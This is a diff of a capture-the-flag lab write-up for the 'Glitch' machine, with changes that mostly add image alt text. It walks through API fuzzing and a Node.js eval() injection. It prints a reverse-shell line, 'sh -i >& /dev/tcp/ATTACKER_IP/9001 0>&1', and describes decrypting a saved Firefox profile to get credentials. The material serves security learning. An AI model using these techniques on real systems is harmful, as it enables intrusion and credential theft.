@@ -28,17 +28,17 @@ Objective:
 
 I started this challenge with a quick nmap service and default script scan. 
 
-![](/uploads/glitch_nmap.png)
+![Nmap service and default script scan results](/uploads/writeups/glitch/glitch_nmap.png)
 
 Where it revealed a website deployed on port 80 with nginx 1.14.0. Upon visiting the website, there is nothing to see but just a glitched background image. Visiting the page source revealed and API end point, which when called, reveals the access token encoded in base64. We can tell that its encoded in base64 because of the signature == at the end of the encryption. 
 
-![](/uploads/pagesource.png)
+![Page source revealing the access API endpoint](/uploads/writeups/glitch/pagesource.png)
 
 Upon discovering an this API endpoint `/api/access`, I have decided to try some fuzzing on this endpoint to see if anything interesting would show up. 
 
 While that was running, I also did some vulnerability research around nginx 1.14.0, nothing turned out to be too interesting or worthy to look into however.
 
-![](/uploads/glitch_ffuf.png)
+![Ffuf API endpoint discovery results](/uploads/writeups/glitch/glitch_ffuf.png)
 
 The fuzzing results turned out to be good atleast finding another API endpoint items.
 
@@ -46,9 +46,9 @@ The fuzzing results turned out to be good atleast finding another API endpoint i
 
 Requesting /api/items returned a JSON object containing several arrays. Using the hint provided to the second question, where it told me to investigate into what other methods was accepted by the API, I went to check what other HTTP methods the endpoint accepted. 
 
-![](/uploads/glitch_burp_access.png)
+![Burp Suite response showing the methods accepted by the access endpoint](/uploads/writeups/glitch/glitch_burp_access.png)
 
-![](/uploads/glitch_burp_items.png)
+![Burp Suite response showing the methods accepted by the items endpoint](/uploads/writeups/glitch/glitch_burp_items.png)
 
 Just GET for access, but we see GET and POST for items. POST is particularly interesting here as it means that this endpoint could process user-supplied data. 
 
@@ -56,23 +56,23 @@ Another thing to note from these headers is `X-POWERED-BY: Express header`, as t
 
 Sending a basic POST request to the /api/items endpoint returned the message there_is_a_glitch_in_the_matrix.
 
-![](/uploads/glitch_burp_post.png)
+![Burp Suite POST request and response for the items endpoint](/uploads/writeups/glitch/glitch_burp_post.png)
 
 I tried posting the message back to it, posting the access token that we discovered, both encoded and decoded, tried posting contents from the `GET /api/items` page, variations of the content from the items page, but nothing seemed to work. 
 
 Since none of the POST body variations changed the response, I considered that the endpoint might expect input through a query string parameter instead. I used ffuf again with FUZZ in the parameter name to test if anything works. 
 
-![](/uploads/glitch_burp_ffuf.png)
+![Ffuf discovering the cmd query parameter](/uploads/writeups/glitch/glitch_burp_ffuf.png)
 
 Luckily, I got a response with cmd. 
 
-![](/uploads/glitch_burp_cmd.png)
+![Burp Suite response exposing a JavaScript reference error and stack trace](/uploads/writeups/glitch/glitch_burp_cmd.png)
 
 I tried a Linux command `id` initally. Rather than executing the command, server returned an HTTP 500 response containing `ReferenceError: id is not defined`. The stack trace showed that the value was being processed by eval() inside `/var/web/routes/api.js`. References to `node_modules/express` also again confirmed that the application was running Express on Node.js.
 
 The error occurred because JavaScript interpreted `id` as a variable name, not as an operating-system command. I therefore needed to supply valid JS that invoked a system command through Node.js. 
 
-![](/uploads/glitch_ce.png)
+![Burp Suite response confirming command execution](/uploads/writeups/glitch/glitch_ce.png)
 
 This confirmed remote command execution. However, this next part is where I had the most trouble.
 
@@ -80,7 +80,7 @@ This confirmed remote command execution. However, this next part is where I had 
 
 After confirming command execution, I used [revshells.com](https://www.revshells.com) to generate several reverse-shell payloads. However, none of the payloads produced a connection even though the API accepted my JS. 
 
-![](/uploads/glitch_failed_rce.png)
+![URL-encoded reverse shell payload in Burp Suite](/uploads/writeups/glitch/glitch_failed_rce.png)
 
 This photo is showing URL encoded payload. Then I tried replacing the contents in .exec() with: `sh -i >& /dev/tcp/ATTACKER_IP/9001 0>&1`
 
@@ -103,7 +103,7 @@ By adding bash -c  in front of: `sh -i >& /dev/tcp/ATTACKER_IP/9001 0>&1`\
 
 We were able to find the user flag here under /home/user.
 
-![](/uploads/glitch_user.png)
+![Terminal showing access to the user account and user flag location](/uploads/writeups/glitch/glitch_user.png)
 
 There is a weird directory here .firefox. A profile is not inherently a vulnerability, but it can contain saved authentication material, which I confirmed that I can read. The presence of readable logins.json and key4.db files indicated that saved credentials might be recoverable. After transferring and decrypting the profile using [firefox decrypt](https://github.com/unode/firefox_decrypt/), I recovered credential for another local user and validated them through successful authentication. 
 
